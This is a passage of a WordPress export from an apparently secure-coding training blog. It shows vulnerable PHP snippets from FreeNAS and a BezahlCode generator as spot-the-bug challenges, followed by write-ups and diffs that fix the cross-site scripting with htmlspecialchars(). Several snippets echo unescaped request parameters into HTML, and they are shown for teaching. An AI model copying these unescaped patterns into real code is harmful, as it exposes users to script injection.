    &lt;text id=&quot;error&quot; x=&quot;&lt;?=$width*0.5?&gt;&quot; y=&quot;&lt;?=$height*0.4?&gt;&quot; visibility=&quot;hidden&quot; &lt;?=$attribs['error']?&gt; text-anchor=&quot;middle&quot;&gt;&lt;?=$error_text?&gt;&lt;/text&gt;
    &lt;text id=&quot;collect_initial&quot; x=&quot;&lt;?=$width*0.5?&gt;&quot; y=&quot;&lt;?=$height*0.4?&gt;&quot; visibility=&quot;hidden&quot; &lt;?=$attribs['collect_initial']?&gt; text-anchor=&quot;middle&quot;&gt;&lt;?=gettext(&quot;Collecting initial data, please wait...&quot;);?&gt;&lt;/text&gt;
  &lt;/g&gt;
  &lt;script type=&quot;text/ecmascript&quot;&gt;
    &lt;![CDATA[

/**
 * getURL is a proprietary Adobe function, but it's simplicity has made it very
 * popular. If getURL is undefined we spin our own by wrapping XMLHttpRequest.
 */
if (typeof getURL == 'undefined') {
  getURL = function(url, callback) {
    if (!url)
      throw 'No URL for getURL';

    try {
      if (typeof callback.operationComplete == 'function')
        callback = callback.operationComplete;
    } catch (e) {}
    if (typeof callback != 'function')
      throw 'No callback function for getURL';

    var http_request = null;
    if (typeof XMLHttpRequest != 'undefined') {
      http_request = new XMLHttpRequest();
    }
    else if (typeof ActiveXObject != 'undefined') {
      try {
        http_request = new ActiveXObject('Msxml2.XMLHTTP');
      } catch (e) {
        try {
          http_request = new ActiveXObject('Microsoft.XMLHTTP');
        } catch (e) {}
      }
    }
    if (!http_request)
      throw 'Both getURL and XMLHttpRequest are undefined';

    http_request.onreadystatechange = function() {
      if (http_request.readyState == 4) {
        callback( { success : true,
                    content : http_request.responseText,
                    contentType : http_request.getResponseHeader(&quot;Content-Type&quot;) } );
      }
    }
    http_request.open('GET', url, true);
    http_request.send(null);
  }
}
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1313</wp:post_id>
		<wp:post_date>2011-02-07 05:07:48</wp:post_date>
		<wp:post_date_gmt>2011-02-07 12:07:48</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>light</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/g2ITT5]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[44e4db619e4a9673a15cf4eafaa19e91]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[44e4db619e4a9673a15cf4eafaa19e91]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Light - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/02/light-cross-site-scripting/</link>
		<pubDate>Fri, 11 Feb 2011 12:34:49 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1317</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: FreeNAS

Fixed in Version: 0.69.3

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Light" href="http://spotthevuln.com/2011/02/light/" target="_blank">Found    Here</a>
<h3>Description</h3>
The code sample for this week contained a couple XSS vulnerabilities.  Although not essential for exploitation, its also interesting to note that this response is within an SVG image.  You can see this by examining the header() api specifying the content-type: header("Content-type: image/svg+xml");

The first issue is pretty easy to follow, so we'll begin there.  On line 11, $ifname is assigned a tainted value from $_GET["ifname"].  After the variable assignment, the authors use the tainted variable to build HTML markup on line 66.

The second issue requires a little bit of tracing.  First, the $ifnum variable is assigned a tainted value from $_GET["ifnum"] on line 10.  $ifnum is then used to build the $fetch_link variable on line 18.  If $fetch_link is ever used to build HTML markup, it will result in XSS.  

The third issue also requires a bit of tracing as well.  Once again, we start with the assignment of a tainted variable to $ifnum on line 10.  $ifnum is then used to build an error message on line 37 ($error_text).  $error_text is then used to build HTML markup on line 72 resulting in XSS.

The developers addressed this issue by using htmlspecialchars() during the inital variable assignments.  This takes care of all three of the XSS issues described above.
<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="8-11,18,37,66,72"]
&lt;?php
... snip ...
require(&quot;guiconfig.inc&quot;);

header(&quot;Content-type: image/svg+xml&quot;);

/********** HTTP GET Based Conf ***********/
+$ifnum=@htmlspecialchars($_GET[&quot;ifnum&quot;]);  // BSD / SNMP interface name / number 
+$ifname=@htmlspecialchars($_GET[&quot;ifname&quot;]) ? htmlspecialchars($_GET[&quot;ifname&quot;]) : &quot;Interface $ifnum&quot;;  //Interface name that will be showed on top right of graph 
-$ifnum=@$_GET[&quot;ifnum&quot;];  // BSD / SNMP interface name / number
-$ifname=@$_GET[&quot;ifname&quot;]?$_GET[&quot;ifname&quot;]:&quot;Interface $ifnum&quot;;  //Interface name that will be showed on top right of graph

/********* Other conf *******/
$scale_type=&quot;follow&quot;; //Autoscale default setup : &quot;up&quot; = only increase scale; &quot;follow&quot; = increase and decrease scale according to current graphed datas
$nb_plot=120;         //NB plot in graph
$time_interval=1;		  //Refresh time Interval
$unit=&quot;bits&quot;;         //Initial unit type: &quot;bits&quot; or &quot;bytes&quot;
$fetch_link = &quot;stats.php?if=$ifnum&quot;;

//SVG attributes
$attribs['bg']='fill=&quot;#EEEEEE&quot; stroke=&quot;none&quot; stroke-width=&quot;0&quot; opacity=&quot;1&quot;';
$attribs['axis']='fill=&quot;black&quot; stroke=&quot;black&quot;';
$attribs['in']='fill=&quot;#00CC00&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;7&quot;';
$attribs['out']='fill=&quot;#FF0000&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;7&quot;';
$attribs['graph_in']='fill=&quot;none&quot; stroke=&quot;#00CC00&quot; stroke-opacity=&quot;0.8&quot;';
$attribs['graph_out']='fill=&quot;none&quot; stroke=&quot;#FF0000&quot; stroke-opacity=&quot;0.8&quot;';
$attribs['legend']='fill=&quot;black&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;4&quot;';
$attribs['graphname']='fill=&quot;#435370&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;8&quot;';
$attribs['grid_txt']='fill=&quot;gray&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;6&quot;';
$attribs['grid']='stroke=&quot;gray&quot; stroke-opacity=&quot;0.5&quot;';
$attribs['switch_unit']='fill=&quot;#435370&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;4&quot; text-decoration=&quot;underline&quot;';
$attribs['switch_scale']='fill=&quot;#435370&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;4&quot; text-decoration=&quot;underline&quot;';
$attribs['error']='fill=&quot;red&quot; font-family=&quot;Arial&quot; font-size=&quot;4&quot;';
$attribs['collect_initial']='fill=&quot;gray&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;4&quot;';

//Error text if we cannot fetch data : depends on which method is used
$error_text = gettext(&quot;Cannot get data about interface&quot;) . &quot; $ifnum&quot;;

$height=100;            //SVG internal height : do not modify
$width=200;             //SVG internal width : do not modify

$encoding = system_get_language_codeset();

/********* Graph DATA **************/
header(&quot;Last-Modified: &quot; . gmdate( &quot;D, j M Y H:i:s&quot; ) . &quot; GMT&quot;);
header(&quot;Expires: &quot; . gmdate( &quot;D, j M Y H:i:s&quot;, time() ) . &quot; GMT&quot;);
header(&quot;Cache-Control: no-store, no-cache, must-revalidate&quot;); // HTTP/1.1
header(&quot;Cache-Control: post-check=0, pre-check=0&quot;, FALSE);
header(&quot;Pragma: no-cache&quot;); // HTTP/1.0
header(&quot;Content-type: image/svg+xml&quot;);
echo &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;{$encoding}\&quot;?&gt;\n&quot;;
?&gt;
&lt;svg width=&quot;100%&quot; height=&quot;100%&quot; viewBox=&quot;0 0 &lt;?=$width?&gt; &lt;?=$height?&gt;&quot; preserveAspectRatio=&quot;none&quot; xml:space=&quot;preserve&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; onload=&quot;init(evt)&quot;&gt;
  &lt;g id=&quot;graph&quot;&gt;
    &lt;rect id=&quot;bg&quot; x1=&quot;0&quot; y1=&quot;0&quot; width=&quot;100%&quot; height=&quot;100%&quot; &lt;?=$attribs['bg']?&gt;/&gt;
    &lt;line id=&quot;axis_x&quot; x1=&quot;0&quot; y1=&quot;0&quot; x2=&quot;0&quot; y2=&quot;100%&quot; &lt;?=$attribs['axis']?&gt;/&gt;
    &lt;line id=&quot;axis_y&quot; x1=&quot;0&quot; y1=&quot;100%&quot; x2=&quot;100%&quot; y2=&quot;100%&quot; &lt;?=$attribs['axis']?&gt;/&gt;
    &lt;path id=&quot;graph_out&quot; d=&quot;M0 &lt;?=$height?&gt; L 0 &lt;?=$height?&gt;&quot; &lt;?=$attribs['graph_out']?&gt;/&gt;
    &lt;path id=&quot;graph_in&quot;  d=&quot;M0 &lt;?=$height?&gt; L 0 &lt;?=$height?&gt;&quot; &lt;?=$attribs['graph_in']?&gt;/&gt;
    &lt;path id=&quot;grid&quot;  d=&quot;M0 &lt;?=$height/4*1?&gt; L &lt;?=$width?&gt; &lt;?=$height/4*1?&gt; M0 &lt;?=$height/4*2?&gt; L &lt;?=$width?&gt; &lt;?=$height/4*2?&gt; M0 &lt;?=$height/4*3?&gt; L &lt;?=$width?&gt; &lt;?=$height/4*3?&gt;&quot; &lt;?=$attribs['grid']?&gt;/&gt;
    &lt;text id=&quot;grid_txt1&quot; x=&quot;&lt;?=$width?&gt;&quot; y=&quot;&lt;?=$height/4*1?&gt;&quot; &lt;?=$attribs['grid_txt']?&gt; text-anchor=&quot;end&quot;&gt;75%&lt;/text&gt;
    &lt;text id=&quot;grid_txt2&quot; x=&quot;&lt;?=$width?&gt;&quot; y=&quot;&lt;?=$height/4*2?&gt;&quot; &lt;?=$attribs['grid_txt']?&gt; text-anchor=&quot;end&quot;&gt;50%&lt;/text&gt;
    &lt;text id=&quot;grid_txt3&quot; x=&quot;&lt;?=$width?&gt;&quot; y=&quot;&lt;?=$height/4*3?&gt;&quot; &lt;?=$attribs['grid_txt']?&gt; text-anchor=&quot;end&quot;&gt;25%&lt;/text&gt;
    &lt;text id=&quot;graph_in_lbl&quot; x=&quot;5&quot; y=&quot;8&quot; &lt;?=$attribs['in']?&gt;&gt;&lt;?=gettext(&quot;In&quot;);?&gt; &lt;tspan id=&quot;graph_in_txt&quot; &lt;?=$attribs['in']?&gt;&gt; &lt;/tspan&gt;&lt;/text&gt;
    &lt;text id=&quot;graph_out_lbl&quot; x=&quot;5&quot; y=&quot;16&quot; &lt;?=$attribs['out']?&gt;&gt;&lt;?=gettext(&quot;Out&quot;);?&gt; &lt;tspan id=&quot;graph_out_txt&quot; &lt;?=$attribs['out']?&gt;&gt; &lt;/tspan&gt;&lt;/text&gt;
    &lt;text id=&quot;ifname&quot; x=&quot;&lt;?=$width?&gt;&quot; y=&quot;8&quot; &lt;?=$attribs['graphname']?&gt; text-anchor=&quot;end&quot;&gt;&lt;?=$ifname?&gt;&lt;/text&gt;
    &lt;text id=&quot;switch_unit&quot; x=&quot;&lt;?=$width*0.55?&gt;&quot; y=&quot;5&quot; &lt;?=$attribs['switch_unit']?&gt;&gt;&lt;?=sprintf(gettext(&quot;Switch to %s/s&quot;), (&quot;bits&quot; === $unit) ? &quot;bytes&quot; : &quot;bits&quot;);?&gt;&lt;/text&gt;
    &lt;text id=&quot;switch_scale&quot; x=&quot;&lt;?=$width*0.55?&gt;&quot; y=&quot;11&quot; &lt;?=$attribs['switch_scale']?&gt;&gt;&lt;?=gettext(&quot;AutoScale&quot;);?&gt; (&lt;?=(&quot;up&quot; === $scale_type) ? gettext(&quot;Up&quot;) : gettext(&quot;Follow&quot;);?&gt;)&lt;/text&gt;
    &lt;text id=&quot;datetime&quot; x=&quot;&lt;?=$width*0.55?&gt;&quot; y=&quot;17&quot; &lt;?=$attribs['legend']?&gt;&gt; &lt;/text&gt;
    &lt;text id=&quot;graphlast&quot; x=&quot;&lt;?=$width*0.55?&gt;&quot; y=&quot;23&quot; &lt;?=$attribs['legend']?&gt;&gt;&lt;?=gettext(&quot;Graph shows last&quot;);?&gt; &lt;?=$time_interval*$nb_plot?&gt; &lt;?=gettext(&quot;seconds&quot;);?&gt;&lt;/text&gt;
    &lt;polygon id=&quot;axis_arrow_x&quot; &lt;?=$attribs['axis']?&gt; points=&quot;&lt;?=($width) . &quot;,&quot; . ($height)?&gt; &lt;?=($width-2) . &quot;,&quot; . ($height-2)?&gt; &lt;?=($width-2) . &quot;,&quot; . $height?&gt;&quot;/&gt;
    &lt;text id=&quot;error&quot; x=&quot;&lt;?=$width*0.5?&gt;&quot; y=&quot;&lt;?=$height*0.4?&gt;&quot; visibility=&quot;hidden&quot; &lt;?=$attribs['error']?&gt; text-anchor=&quot;middle&quot;&gt;&lt;?=$error_text?&gt;&lt;/text&gt;
    &lt;text id=&quot;collect_initial&quot; x=&quot;&lt;?=$width*0.5?&gt;&quot; y=&quot;&lt;?=$height*0.4?&gt;&quot; visibility=&quot;hidden&quot; &lt;?=$attribs['collect_initial']?&gt; text-anchor=&quot;middle&quot;&gt;&lt;?=gettext(&quot;Collecting initial data, please wait...&quot;);?&gt;&lt;/text&gt;
  &lt;/g&gt;
  &lt;script type=&quot;text/ecmascript&quot;&gt;
    &lt;![CDATA[

/**
 * getURL is a proprietary Adobe function, but it's simplicity has made it very
 * popular. If getURL is undefined we spin our own by wrapping XMLHttpRequest.
 */
if (typeof getURL == 'undefined') {
  getURL = function(url, callback) {
    if (!url)
      throw 'No URL for getURL';

    try {
      if (typeof callback.operationComplete == 'function')
        callback = callback.operationComplete;
    } catch (e) {}
    if (typeof callback != 'function')
      throw 'No callback function for getURL';

    var http_request = null;
    if (typeof XMLHttpRequest != 'undefined') {
      http_request = new XMLHttpRequest();
    }
    else if (typeof ActiveXObject != 'undefined') {
      try {
        http_request = new ActiveXObject('Msxml2.XMLHTTP');
      } catch (e) {
        try {
          http_request = new ActiveXObject('Microsoft.XMLHTTP');
        } catch (e) {}
      }
    }
    if (!http_request)
      throw 'Both getURL and XMLHttpRequest are undefined';

    http_request.onreadystatechange = function() {
      if (http_request.readyState == 4) {
        callback( { success : true,
                    content : http_request.responseText,
                    contentType : http_request.getResponseHeader(&quot;Content-Type&quot;) } );
      }
    }
    http_request.open('GET', url, true);
    http_request.send(null);
  }
}
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1317</wp:post_id>
		<wp:post_date>2011-02-11 05:34:49</wp:post_date>
		<wp:post_date_gmt>2011-02-11 12:34:49</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>light-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="freenas"><![CDATA[FreeNAS]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="post_tag" nicename="htmlspecialchars"><![CDATA[htmlspecialchars]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="svg-xml"><![CDATA[svg xml]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/hhETkG]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[565cfdb26bfe66c37240c12d0e0237e3]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Radical</title>
		<link>http://spotthevuln.com/2011/02/radical/</link>
		<pubDate>Mon, 14 Feb 2011 13:29:29 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1321</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>When you are right, you cannot be too radical; When you are wrong, you cannot be too conservative.</strong> <br><strong>  - Martin Luther King, Jr.
</strong></blockquote>
[sourcecode language="php"]
&lt;?php
    if ($data!='')
    {
?&gt;
&lt;img src=&quot;/generator/?generate=&lt;?php echo urlencode($data)?&gt;&quot;/&gt;
&lt;?php
    }
?&gt;
&lt;/div&gt;&lt;br/&gt;
&lt;form action=&quot;/generator/&quot; name=&quot;wizard&quot; method=&quot;post&quot; class=&quot;BezahlCodeForm&quot;&gt;

&lt;label for=&quot;singlepayment&quot;&gt;&lt;input type=&quot;radio&quot; id=&quot;singlepayment&quot; name=&quot;gen_type&quot; value=&quot;singlepayment&quot; &lt;?php if($_REQUEST['gen_type']==&quot;singlepayment&quot; || empty($_REQUEST['gen_type'])) echo 'checked=&quot;checked&quot;'?&gt; /&gt; &amp;Uuml;berweisung&lt;/label&gt;&lt;br /&gt;
&lt;label for=&quot;singlepaymentspende&quot;&gt;&lt;input type=&quot;radio&quot; id=&quot;singlepaymentspende&quot; name=&quot;gen_type&quot; value=&quot;singlepaymentspende&quot; &lt;?php if($_REQUEST['gen_type']==&quot;singlepaymentspende&quot;) echo 'checked=&quot;checked&quot;'?&gt;/&gt; Spendenzahlung&lt;/label&gt;&lt;br /&gt;
&lt;label for=&quot;singledirectdebit&quot;&gt;&lt;input type=&quot;radio&quot; id=&quot;singledirectdebit&quot; name=&quot;gen_type&quot; value=&quot;singledirectdebit&quot; &lt;?php if($_REQUEST['gen_type']==&quot;singledirectdebit&quot;) echo 'checked=&quot;checked&quot;'?&gt;/&gt; Lastschrift&lt;/label&gt;&lt;br /&gt;

Name:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: DTAUS Text&quot; id=&quot;gen_name&quot; onblur=&quot;checkInput(this, 'dtaus')&quot; name=&quot;gen_name&quot; maxlength=&quot;27&quot; value=&quot;&lt;?= isset($_REQUEST['gen_name'])?$_REQUEST['gen_name']:&quot;&quot;?&gt;&quot;&gt;
&lt;br /&gt;
Kontonummer:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Ganzzahl z.B. 1234&quot; id=&quot;gen_account&quot; onblur=&quot;checkInput(this, 'ganzzahl')&quot; name=&quot;gen_account&quot; value=&quot;&lt;?= isset($_REQUEST['gen_account'])?$_REQUEST['gen_account']:&quot;&quot;?&gt;&quot; &gt;
&lt;br /&gt;
BLZ:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Ganzzahl z.B. 1234&quot; id=&quot;gen_BNC&quot; onblur=&quot;checkInput(this, 'ganzzahl')&quot; name=&quot;gen_BNC&quot; value=&quot;&lt;?= isset($_REQUEST['gen_BNC'])?$_REQUEST['gen_BNC']:&quot;&quot;?&gt;&quot; &gt;
&lt;br /&gt;
Betrag in Euro (z.B. 1234,50) &lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Dezimalzahl z.B. 1234,50&quot; onblur=&quot;checkInput(this, 'dezimalzahl')&quot; id=&quot;gen_amount&quot; name=&quot;gen_amount&quot; value=&quot;&lt;?= isset($_REQUEST['gen_amount'])?$_REQUEST['gen_amount']:&quot;&quot;?&gt;&quot; &gt;
&lt;br /&gt;
Verwendungszweck:&lt;br /&gt;&lt;input type=&quot;text&quot; id=&quot;gen_reason&quot; tooltipText=&quot;Format: DTAUS Text&quot; onblur=&quot;checkInput(this, 'dtaus')&quot; name=&quot;gen_reason&quot; maxlength=&quot;54&quot; value=&quot;&lt;?= isset($_REQUEST['gen_reason'])?$_REQUEST['gen_reason']:&quot;&quot;?&gt;&quot; &gt;
&lt;br/&gt;
&lt;input type=&quot;button&quot; value=&quot;Erstellen&quot; onclick='javascript:generateImage();'&gt;
&lt;/form&gt;
&lt;?php if(!(get_option(&quot;bezahlcode_showlink&quot;) == &quot;hidden&quot;)) {	?&gt;
&lt;br /&gt;
&lt;span class=&quot;bezahlCodeLink&quot;&gt;Weitere Informationen: &lt;a href=&quot;http://www.bezahlcode.de&quot; title=&quot;BezahlCode - Schnell, einfach und sicher bezahlen&quot; target=&quot;_blank&quot;&gt;www.bezahlcode.de&lt;/a&gt;&lt;/span&gt;
&lt;?php } ?&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
var tooltipObj = new DHTMLgoodies_formTooltip();
tooltipObj.initFormFieldTooltip();
&lt;/script&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1321</wp:post_id>
		<wp:post_date>2011-02-14 06:29:29</wp:post_date>
		<wp:post_date_gmt>2011-02-14 13:29:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>radical</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/haruy9]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[620e9e98733a8516afc9fde72764fbcd]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Radical - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/02/radical-cross-site-scripting/</link>
		<pubDate>Fri, 18 Feb 2011 13:31:20 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1326</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: BezahlCode-Generator

Fixed in Version: 1.1

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Radical" href="http://spotthevuln.com/2011/02/radical/" target="_blank">Found    Here</a>
<h3>Description</h3>
A couple straightforward XSS bugs.  $_REQUEST will create an associative array which contains the contents of $_GET, $_POST, and $_COOKIE which are all user/attacker controllable.   These variables are then used to create HTML markup.  Security bugs are caused by many different reasons.  When auditing code for security issues, if you come across issues like the ones shown below its highly likely that the developer simply doesn’t understand the security risk they created.  It might be a good idea to review other change lists associated with this developer as they will likely contain similar code symptoms.  This type of issue is also indicative of lack of security awareness.  The developer here could use some security education about various security issues along with some tips on preventing these types of security issues in the future. 
<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="16,17,19,20,25,26,28,29"]
&lt;?php
    if ($data!='')
    {
?&gt;
&lt;img src=&quot;/generator/?generate=&lt;?php echo urlencode($data)?&gt;&quot;/&gt;
&lt;?php
    }
?&gt;
&lt;/div&gt;&lt;br/&gt;
&lt;form action=&quot;/generator/&quot; name=&quot;wizard&quot; method=&quot;post&quot; class=&quot;BezahlCodeForm&quot;&gt;

&lt;label for=&quot;singlepayment&quot;&gt;&lt;input type=&quot;radio&quot; id=&quot;singlepayment&quot; name=&quot;gen_type&quot; value=&quot;singlepayment&quot; &lt;?php if($_REQUEST['gen_type']==&quot;singlepayment&quot; || empty($_REQUEST['gen_type'])) echo 'checked=&quot;checked&quot;'?&gt; /&gt; &amp;Uuml;berweisung&lt;/label&gt;&lt;br /&gt;
&lt;label for=&quot;singlepaymentspende&quot;&gt;&lt;input type=&quot;radio&quot; id=&quot;singlepaymentspende&quot; name=&quot;gen_type&quot; value=&quot;singlepaymentspende&quot; &lt;?php if($_REQUEST['gen_type']==&quot;singlepaymentspende&quot;) echo 'checked=&quot;checked&quot;'?&gt;/&gt; Spendenzahlung&lt;/label&gt;&lt;br /&gt;
&lt;label for=&quot;singledirectdebit&quot;&gt;&lt;input type=&quot;radio&quot; id=&quot;singledirectdebit&quot; name=&quot;gen_type&quot; value=&quot;singledirectdebit&quot; &lt;?php if($_REQUEST['gen_type']==&quot;singledirectdebit&quot;) echo 'checked=&quot;checked&quot;'?&gt;/&gt; Lastschrift&lt;/label&gt;&lt;br /&gt;

-Name:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: DTAUS Text&quot; id=&quot;gen_name&quot; onblur=&quot;checkInput(this, 'dtaus')&quot; name=&quot;gen_name&quot; maxlength=&quot;27&quot; value=&quot;&lt;?= isset($_REQUEST['gen_name'])?$_REQUEST['gen_name']:&quot;&quot;?&gt;&quot;&gt;
+Name:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: DTAUS Text&quot; id=&quot;gen_name&quot; onblur=&quot;checkInput(this, 'dtaus')&quot; name=&quot;gen_name&quot; maxlength=&quot;27&quot; value=&quot;&lt;?= isset($_REQUEST['gen_name'])?htmlspecialchars($_REQUEST['gen_name']):&quot;&quot;?&gt;&quot;&gt; 
&lt;br /&gt;
-Kontonummer:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Ganzzahl z.B. 1234&quot; id=&quot;gen_account&quot; onblur=&quot;checkInput(this, 'ganzzahl')&quot; name=&quot;gen_account&quot; value=&quot;&lt;?= isset($_REQUEST['gen_account'])?$_REQUEST['gen_account']:&quot;&quot;?&gt;&quot; &gt;
+Kontonummer:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Ganzzahl z.B. 1234&quot; id=&quot;gen_account&quot; onblur=&quot;checkInput(this, 'ganzzahl')&quot; name=&quot;gen_account&quot; value=&quot;&lt;?= isset($_REQUEST['gen_account'])?htmlspecialchars($_REQUEST['gen_account']):&quot;&quot;?&gt;&quot; &gt; 
&lt;br /&gt;
